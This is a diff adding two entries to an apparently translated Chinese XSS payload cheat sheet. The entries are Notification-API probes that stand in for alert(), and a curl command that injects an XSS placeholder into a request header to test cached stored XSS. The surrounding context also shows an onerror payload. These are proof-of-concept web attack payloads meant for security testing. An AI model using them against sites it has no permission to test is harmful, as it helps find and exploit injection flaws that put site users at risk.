@@ -198,6 +198,18 @@ payload在反射后的javascript代码中有结束脚本标签（</script>）时
 ```
 <html data-toggle=tab href="<img src=x onerror=alert(1)>">
 ```
+**32.Browser Notification (浏览器通知)** <br>
+以下payload用作alert()，prompt()和confirm()函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>
+```
+Notification.requestPermission(x=>{new(Notification)(1)})
+new(Notification)(1)
+```
+**33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)** <br>
+该payload用于使用MISS-MISS-HIT缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将<XSS>替换为相应的payload，并将TARGET替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>
+```
+$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
+```
+****
 
 ## 致谢
 **英文议题作者：** <br>
